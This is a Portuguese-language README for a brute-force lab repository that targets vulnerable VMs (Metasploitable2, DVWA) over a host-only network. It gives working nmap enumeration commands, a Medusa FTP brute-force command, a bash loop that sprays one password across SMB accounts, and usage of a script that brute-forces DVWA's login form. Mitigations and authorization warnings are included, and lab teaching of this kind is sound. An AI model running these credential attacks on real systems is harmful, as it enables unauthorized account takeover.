# Kali + Medusa — Bruteforce Lab

**Resumo:** Repositório de laboratório para exercícios controlados de força bruta e password spraying usando **Kali Linux** e **Medusa**, com alvos em VMs vulneráveis (ex.: Metasploitable2, DVWA). Objetivo: demonstrar técnicas, coletar evidências e documentar mitigação.

---

## Índice

* [Resumo](#resumo)
* [Pré-requisitos](#pré-requisitos)
* [Arquitetura do laboratório](#arquitetura-do-laboratório)
* [Configuração passo-a-passo](#configuração-passo-a-passo)
* [Wordlists e arquivos incluídos](#wordlists-e-arquivos-inclu%C3%ADdos)
* [Comandos e exemplos práticos](#comandos-e-exemplos-práticos)

  * [1) Enumeração inicial (nmap)](#1-enumeração-inicial-nmap)
  * [2) Força bruta FTP (Medusa)](#2-força-bruta-ftp-medusa)
  * [3) Password-spray SMB (Medusa)](#3-password-spray-smb-medusa)
  * [4) Brute-force de formulário web (DVWA) — exemplo com Python](#4-brute-force-de-formul%C3%A1rio-web-dvwa-—-exemplo-com-python)
* [Validação / Evidências esperadas](#valida%C3%A7%C3%A3o--evid%C3%AAncias-esperadas)
* [Mitigações recomendadas](#mitiga%C3%A7%C3%B5es-recomendadas)
* [Boas práticas / Avisos de segurança](#boas-pr%C3%A1ticas--avisos-de-seguran%C3%A7a)
* [Contato](#contato)

---

## Pré-requisitos

* VirtualBox (ou outro hypervisor)
* VMs: **Kali Linux** (atacante) e **Metasploitable2** / DVWA (alvo)
* Rede: **Host-only** ou **Internal Network**
* Ferramentas no Kali: `medusa`, `nmap`, `ftp`, `smbclient`, `python3`, `requests`, `bs4` (opcional)
* Permissão explícita para executar testes

---

## Arquitetura do laboratório

* Rede isolada host-only: ex. `192.168.56.0/24`

  * Kali: `192.168.56.10`
  * Metasploitable2: `192.168.56.20`
  * DVWA (opcional): `192.168.56.21`

---

## Configuração passo-a-passo (resumo)

1. Crie duas VMs em VirtualBox (Kali e Metasploitable2).
2. Configure adaptadores para a mesma rede Host-only.
3. Inicie as VMs e confirme conectividade:

   ```bash
   ping -c 3 192.168.56.20
   ```
4. No Kali, instale medusa:

   ```bash
   sudo apt update && sudo apt install medusa -y
   ```
5. Prepare wordlists em `wordlists/` e scripts em `scripts/`.

---

## Wordlists e arquivos incluídos

* `wordlists/common.txt` — senhas curtas de exemplo
* `wordlists/users.txt` — lista de usuários para password-spray
* `scripts/medusa_ftp.sh` — wrapper bash para Medusa (FTP)
* `scripts/medusa_smb_spray.sh` — wrapper bash para spray SMB
* `scripts/dvwa_form_bruteforce.py` — automação simples para DVWA

> Observação: adapte/troque wordlists por listas maiores conforme necessário — sempre em ambiente controlado.

---

## Comandos e exemplos práticos

### 1) Enumeração inicial (nmap)

Descobrir serviços e portas:

```bash
nmap -sV -p- 192.168.56.20 -oN nmap_all_ports.txt
nmap -sC -sV -p21,22,80,139,445 192.168.56.20 -oN nmap_services.txt
```

### 2) Força bruta FTP (Medusa)

Uso direto:

```bash
medusa -h 192.168.56.20 -u msfadmin -P wordlists/common.txt -M ftp -T 4 -f
```

Flags importantes:

* `-h` target IP
* `-u` usuário (ou `-U users.txt` para lista)
* `-P` wordlist de senhas
* `-M ftp` módulo FTP
* `-T 4` threads
* `-f` parar ao encontrar credenciais válidas

Validação:

```bash
ftp 192.168.56.20
# ou
curl --user msfadmin:FOUND_PASSWORD ftp://192.168.56.20/
```

### 3) Password-spray SMB (Medusa)

Exemplo:

```bash
# testar uma senha comum contra vários usuários
while IFS= read -r user; do
  medusa -h 192.168.56.20 -u "$user" -p "Password123" -M smbnt -T 6
done < wordlists/users.txt
```

Validação:

```bash
smbclient -L //192.168.56.20 -U user%Password123
```

### 4) Brute-force de formulário web (DVWA) — exemplo com Python

Script: `scripts/dvwa_form_bruteforce.py`
Uso:

```bash
python3 scripts/dvwa_form_bruteforce.py "http://192.168.56.21/dvwa/vulnerabilities/brute/" admin wordlists/common.txt
```

Notas:

* DVWA usa token CSRF; o script captura token e envia POST.
* Para proteger a aplicação, ajuste DVWA `security` para `low` somente em laboratório.

---

## Validação / Evidências esperadas

* Logs do `medusa` mostrando credenciais encontradas (salve saida `> outputs/medusa_ftp.txt`)
* Captura de tela de conexão FTP autenticada (`images/ftp_logged.png`)
* Output `smbclient` com listagem de shares (`images/smb_shares.png`)
* Prints do `nmap` e da interface DVWA (login bem-sucedido)

Sugestão de coleta:

```bash
medusa ... | tee outputs/medusa_ftp.txt
smbclient ... | tee outputs/smb_client.txt
```

---

## Mitigações recomendadas

1. Políticas de senha fortes.
2. Account lockout ou rate-limiting após N tentativas.
3. Autenticação multifator (MFA).
4. Monitoramento e alertas por padrão (SIEM/IDS).
5. Aplicar patches e remover serviços desnecessários.
6. Segmentação de rede para minimizar superfície de ataque.

---

## Boas práticas e avisos

* **Não execute** estes testes em redes/serviços que você não possui autorização explícita.
* Não comite chaves, senhas reais ou dados sensíveis no repositório.
* Use `.gitignore` para evitar subir arquivos de credenciais.

## Contato

Autor: Jose Augusto Terence

Repo: `https://github.com/jterencesilva/kali-medusa-bruteforce`

E-mail: jterencesilva@gmail.com
